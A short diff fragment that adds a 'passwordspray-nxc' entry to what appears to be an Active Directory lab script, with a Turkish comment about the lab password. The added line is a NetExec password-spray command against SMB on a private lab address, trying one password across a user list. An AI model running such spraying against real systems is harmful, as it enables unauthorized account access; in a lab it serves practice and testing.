@@ -1,3 +1,10 @@
+
+passwordspray-nxc:
+nxc smb 192.168.39.143 -d lab.local -u users.txt -p 'P@ssw0rd123!' --continue-on-success
+
+
+
+
 Import-Module ActiveDirectory
 
 # Lab parolası
